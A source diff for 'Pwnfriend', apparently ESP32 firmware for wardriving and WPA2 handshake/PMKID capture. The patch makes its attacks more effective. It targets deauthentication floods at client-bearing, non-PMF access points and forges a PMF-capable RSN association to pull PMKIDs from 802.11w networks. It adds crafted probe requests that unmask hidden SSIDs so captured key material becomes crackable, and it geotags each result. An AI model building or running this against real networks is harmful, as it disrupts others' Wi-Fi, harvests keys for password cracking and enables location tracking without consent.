@@ -1,4 +1,5 @@
 #include "Pwnfriend.h"
+#include "pwnfriend_frames.h" // pure, host-testable 802.11 parsers (see tests/)
 
 #include <LinkedList.h>
 #include <ArduinoJson.h>
@@ -78,7 +79,12 @@ static void fmt_mac(char* out, const uint8_t* m) {
 // keys are omitted entirely with no fix. dtostrf (not snprintf %f) so this works
 // on cores built with newlib-nano's float-less *printf.
 static void fmt_geo(char* out, size_t out_sz, bool has_fix, double lat, double lon) {
-    if (!has_fix) { if (out_sz) out[0] = '\0'; return; }
+    // Drop the geotag on no-fix OR an out-of-range coord: a single garbage GPS sample
+    // (e.g. a corrupt lon of 1.3e14) otherwise poisons wardrive.csv and the map.
+    if (!has_fix || lat < -90.0 || lat > 90.0 || lon < -180.0 || lon > 180.0) {
+        if (out_sz) out[0] = '\0';
+        return;
+    }
     char latb[16], lonb[16];
     dtostrf(lat, 0, 7, latb);
     dtostrf(lon, 0, 7, lonb);
@@ -213,6 +219,7 @@ void Pwnfriend::reset() {
     _epoch_pwnd = false;
     _epoch_seq = 0;
     _ep_assoc = _ep_deauth = _ep_unicast = _ep_hs = _ep_pmkid = _ep_miss = 0;
+    _ep_dpmf = _ep_dnocli = 0;
     _last_deauth_ms = 0;
     _cur_dwell_ms = HOP_RECON_TIME_MS;
     _attack_min_rssi = DEFAULT_ATTACK_MIN_RSSI;
@@ -247,10 +254,11 @@ void Pwnfriend::endEpoch(uint32_t now) {
     char line[200];
     int n = snprintf(line, sizeof(line),
         "PWNFRIEND_EPOCH {\"n\":%lu,\"recon\":%d,\"attackable\":%d,\"chans\":%d,\"assoc\":%u,"
-        "\"deauth\":%u,\"unicast\":%u,\"sta\":%d,\"hs\":%u,\"pmkid\":%u,\"miss\":%u}\n",
+        "\"deauth\":%u,\"unicast\":%u,\"sta\":%d,\"hs\":%u,\"pmkid\":%u,\"miss\":%u,"
+        "\"dpmf\":%u,\"dnocli\":%u}\n",
         (unsigned long)_epoch_seq, _n_recon, attackable_n, _n_attack, (unsigned)_ep_assoc,
         (unsigned)_ep_deauth, (unsigned)_ep_unicast, _n_sta, (unsigned)_ep_hs,
-        (unsigned)_ep_pmkid, (unsigned)_ep_miss);
+        (unsigned)_ep_pmkid, (unsigned)_ep_miss, (unsigned)_ep_dpmf, (unsigned)_ep_dnocli);
     if (n > 0) Serial.write((const uint8_t*)line, (size_t)(n >= (int)sizeof(line) ? sizeof(line) - 1 : n));
     _epoch_seq++;
     _ep_assoc = _ep_deauth = _ep_unicast = _ep_hs = _ep_pmkid = _ep_miss = 0;
@@ -258,6 +266,17 @@ void Pwnfriend::endEpoch(uint32_t now) {
     if (_epoch_pwnd) _inactive_epochs = 0;
     else if (_inactive_epochs < 255) _inactive_epochs++;
     _epoch_pwnd = false;
+
+    // Recon table saturated? Flush it (and the clients that index into it) so the next
+    // sweep repopulates with our CURRENT surroundings. Without this, once 128 APs are
+    // seen the table never forgets, so on the move we go blind to every new network and
+    // just re-hammer the stale set. markPwnd's dedup (_pwnd_seen) survives, so already-
+    // captured APs stay skipped after the flush and can't be re-counted.
+    if (_n_recon >= MAX_RECON) {
+        _n_recon = 0;
+        _n_sta = 0;
+    }
+
     _phase = PHASE_RECON;
     _phase_ms = now;
     _last_hop_ms = 0;
@@ -309,6 +328,34 @@ bool Pwnfriend::deauthable(const ReconAP& ap) const {
     return ap.rssi == 0 || ap.rssi >= _attack_min_rssi;
 }
 
+// Does this AP have a recently-seen associated client? Deauth without one is wasted
+// (nothing reconnects to replay the 4-way) — bettercap only deauths APs with clients.
+bool Pwnfriend::hasClient(int ap_idx) const {
+    uint32_t now = millis();
+    for (int s = 0; s < _n_sta; s++)
+        if (_sta[s].ap_idx == (uint8_t)ap_idx && (uint32_t)(now - _sta[s].last_seen) < STA_TTL_MS)
+            return true;
+    return false;
+}
+
+// Directed probe request with a wildcard SSID, so a nameless AP (we caught its EAPOL
+// before ever hearing a beacon) answers with a probe response carrying its ESSID —
+// which reportAP() then adopts, making a keymat-only capture crackable.
+void Pwnfriend::probeAP(const uint8_t* bssid) {
+    uint8_t f[32];
+    int p = 0;
+    f[p++] = 0x40; f[p++] = 0x00;          // FC: mgmt, subtype 4 = probe request
+    f[p++] = 0x00; f[p++] = 0x00;          // duration
+    memcpy(f + p, bssid, 6); p += 6;       // Addr1 = target AP (directed)
+    memcpy(f + p, _session_id, 6); p += 6; // Addr2 = our station
+    memcpy(f + p, bssid, 6); p += 6;       // Addr3 = BSSID
+    f[p++] = 0x00; f[p++] = 0x00;          // seq/frag
+    f[p++] = 0x00; f[p++] = 0x00;          // SSID IE, len 0 (wildcard -> "who are you?")
+    f[p++] = 0x01; f[p++] = 0x04;          // Supported Rates IE
+    f[p++] = 0x82; f[p++] = 0x84; f[p++] = 0x8b; f[p++] = 0x96; // 1/2/5.5/11 Mbps
+    esp_wifi_80211_tx(WIFI_IF_AP, f, p, false);
+}
+
 bool Pwnfriend::isWhitelisted(const uint8_t* bssid) const {
     for (int i = 0; i < _n_wl; i++)
         if (memcmp(_wl[i], bssid, 6) == 0) return true;
@@ -318,10 +365,14 @@ bool Pwnfriend::isWhitelisted(const uint8_t* bssid) const {
 // How long to camp on a channel: scale with the count of attackable APs on it, so
 // the busy channels (1/6/11) get the airtime and near-empty ones drain fast.
 uint32_t Pwnfriend::channelDwellMs(uint8_t channel) {
-    int targets = 0;
+    // Weight by eligible APs, but count APs that HAVE a client double: those are where
+    // deauth can force a 4-way, so it's worth camping longer (bettercap/pwnagotchi
+    // dwell where the traffic is).
+    int weight = 0;
     for (int i = 0; i < _n_recon; i++)
-        if (_recon[i].channel == channel && attackable(_recon[i])) targets++;
-    uint32_t d = DWELL_PER_AP_MS * (uint32_t)(targets > 0 ? targets : 1);
+        if (_recon[i].channel == channel && attackable(_recon[i]))
+            weight += hasClient(i) ? 2 : 1;
+    uint32_t d = DWELL_PER_AP_MS * (uint32_t)(weight > 0 ? weight : 1);
     if (d < DWELL_MIN_MS) d = DWELL_MIN_MS;
     if (d > DWELL_MAX_MS) d = DWELL_MAX_MS;
     return d;
@@ -337,15 +388,25 @@ void Pwnfriend::attackChannel(uint8_t channel) {
         if (_assoc_policy) {
             assocAP(_recon[i].bssid, _recon[i].ssid);  // auth+assoc -> RSN PMKID (M1)
             _ep_assoc++;
+            if (_recon[i].ssid[0] == '\0') probeAP(_recon[i].bssid); // make it name itself
         }
-        if (_deauth_policy && deauthable(_recon[i])) { // deauth only if the link is worth it
-            deauthAP(_recon[i].bssid);                 // broadcast fallback
-            _ep_deauth++;
-            for (int s = 0; s < _n_sta; s++)           // unicast each known client
-                if (_sta[s].ap_idx == (uint8_t)i) {
-                    deauthClient(_recon[i].bssid, _sta[s].mac);
-                    _ep_unicast++;
-                }
+        // Deauth only when it can actually work: strong enough link, NOT PMF-protected
+        // (802.11w ignores our deauth), and there's a real client to knock off. Count
+        // WHY we skip (dpmf/dnocli) so the telemetry shows if the gates behave.
+        if (_deauth_policy && deauthable(_recon[i])) {
+            if (_recon[i].pmf) {
+                _ep_dpmf++;
+            } else if (!hasClient(i)) {
+                _ep_dnocli++;
+            } else {
+                deauthAP(_recon[i].bssid);                 // broadcast fallback
+                _ep_deauth++;
+                for (int s = 0; s < _n_sta; s++)           // unicast each known client
+                    if (_sta[s].ap_idx == (uint8_t)i) {
+                        deauthClient(_recon[i].bssid, _sta[s].mac);
+                        _ep_unicast++;
+                    }
+            }
         }
         if (_recon[i].attacks < 255) _recon[i].attacks++;
         if (!_recon[i].missed && _recon[i].attacks >= MISS_ATTEMPTS &&
@@ -367,7 +428,8 @@ void Pwnfriend::attackChannel(uint8_t channel) {
 void Pwnfriend::deauthChannelPass(uint8_t channel) {
     for (int i = 0; i < _n_recon; i++) {
         if (_recon[i].channel != channel || !attackable(_recon[i])) continue;
-        if (!deauthable(_recon[i])) continue;  // too weak to deauth (assoc already fired on entry)
+        // Same gate as entry: skip too-weak, PMF-protected, or clientless APs.
+        if (!deauthable(_recon[i]) || _recon[i].pmf || !hasClient(i)) continue;
         deauthAP(_recon[i].bssid);
         _ep_deauth++;
         for (int s = 0; s < _n_sta; s++)
@@ -751,7 +813,8 @@ void Pwnfriend::assocAP(const uint8_t* bssid, const char* ssid) {
         0x00, 0x0f, 0xac, 0x04,             // pairwise cipher: CCMP
         0x01, 0x00,                         // AKM count
         0x00, 0x0f, 0xac, 0x02,             // AKM: WPA2-PSK
-        0x0c, 0x00                          // RSN capabilities
+        0x8c, 0x00                          // RSN capabilities + MFPC (PMF-capable) so
+                                            // 802.11w APs still accept the assoc -> PMKID
     };
     memcpy(f + p, RSN, sizeof(RSN)); p += sizeof(RSN);
 
@@ -859,24 +922,12 @@ void Pwnfriend::streamSyntheticBeacon(const uint8_t* bssid, const char* ssid) {
 
 bool Pwnfriend::reportAP(const uint8_t* payload, int length, int rssi, int channel,
                          bool has_fix, double lat, double lon) {
-    if (length < 38 || payload[0] != 0x80) return false;   // beacon only
-    const uint8_t* bssid = payload + 10;                    // Addr2 = BSSID (beacon)
+    // Beacon (0x80) OR probe response (0x50): both carry the SSID IE after the same
+    // 12-byte fixed params, so either can name a network. Accepting probe responses
+    // recovers ESSIDs we'd otherwise miss (a big source of uncrackable "partial" caps).
+    if (length < 38 || (payload[0] != 0x80 && payload[0] != 0x50)) return false;
+    const uint8_t* bssid = payload + 10;                    // Addr2 = BSSID
     int8_t r = (rssi < -128 || rssi > 0) ? 0 : (int8_t)rssi;
-    int known = reconIndex(bssid);
-    if (known >= 0) {                                       // re-heard: refresh RSSI
-        if (r != 0) _recon[known].rssi = r;                // keep attackable()/targeting live
-        uint32_t now = millis();
-        if (now - _recon[known].last_rssi_ms >= PWNFRIEND_RSSI_EMIT_MS) {
-            _recon[known].last_rssi_ms = now;
-            char mac[18];
-            fmt_mac(mac, bssid);
-            char line[40];
-            int n = snprintf(line, sizeof(line), "PWNFRIEND_RSSI %s %d\n", mac, (int)r);
-            if (n > 0) Serial.write((const uint8_t*)line, (size_t)n);
-        }
-        return false;                                      // not a new AP
-    }
-    if (_n_recon >= MAX_RECON) return false;                // table full
 
     // SSID IE (tag 0x00) is the first tagged param, at offset 36.
     char ssid[33] = {0};
@@ -891,6 +942,41 @@ bool Pwnfriend::reportAP(const uint8_t* payload, int length, int rssi, int chann
         }
     }
 
+    int known = reconIndex(bssid);
+    if (known >= 0) {                                       // re-heard
+        if (r != 0) _recon[known].rssi = r;                // keep attackable()/targeting live
+        // Late ESSID: we saw/captured this AP without a name and now a beacon/probe-
+        // response reveals it. Adopt it, push the naming frame into the per-BSSID pcap,
+        // and re-announce so a keymat-only "partial" capture becomes crackable.
+        if (_recon[known].ssid[0] == '\0' && ssid[0] != '\0') {
+            strncpy(_recon[known].ssid, ssid, sizeof(_recon[known].ssid) - 1);
+            _recon[known].ssid[sizeof(_recon[known].ssid) - 1] = '\0';
+            streamFrameHex(bssid, payload, length);
+            char mac[18];
+            fmt_mac(mac, bssid);
+            char geo[48];
+            fmt_geo(geo, sizeof(geo), has_fix, lat, lon);
+            char line[256];
+            int n = snprintf(line, sizeof(line),
+                "PWNFRIEND_AP {\"bssid\":\"%s\",\"ssid\":\"%s\",\"channel\":%d,\"rssi\":%d%s}\n",
+                mac, ssid, channel, rssi, geo);
+            if (n > 0)
+                Serial.write((const uint8_t*)line,
+                             (size_t)(n >= (int)sizeof(line) ? sizeof(line) - 1 : n));
+        }
+        uint32_t now = millis();
+        if (now - _recon[known].last_rssi_ms >= PWNFRIEND_RSSI_EMIT_MS) {
+            _recon[known].last_rssi_ms = now;
+            char mac[18];
+            fmt_mac(mac, bssid);
+            char line[40];
+            int n = snprintf(line, sizeof(line), "PWNFRIEND_RSSI %s %d\n", mac, (int)r);
+            if (n > 0) Serial.write((const uint8_t*)line, (size_t)n);
+        }
+        return false;                                      // not a new AP
+    }
+    if (_n_recon >= MAX_RECON) return false;                // table full
+
     memcpy(_recon[_n_recon].bssid, bssid, 6);
     strncpy(_recon[_n_recon].ssid, ssid, sizeof(_recon[_n_recon].ssid) - 1);
     _recon[_n_recon].ssid[sizeof(_recon[_n_recon].ssid) - 1] = '\0';
@@ -898,6 +984,7 @@ bool Pwnfriend::reportAP(const uint8_t* payload, int length, int rssi, int chann
     _recon[_n_recon].rssi = r;  // first-seen; refreshed on later beacons
     _recon[_n_recon].attacks = 0;
     _recon[_n_recon].missed = false;
+    _recon[_n_recon].pmf = pwnfriend_rsn_requires_pmf(payload, length); // 802.11w -> no deauth
     _recon[_n_recon].last_rssi_ms = millis();  // the PWNFRIEND_AP line already carried it
     // Publish the entry before bumping the count (rx-callback writer vs loop reader).
     __sync_synchronize();
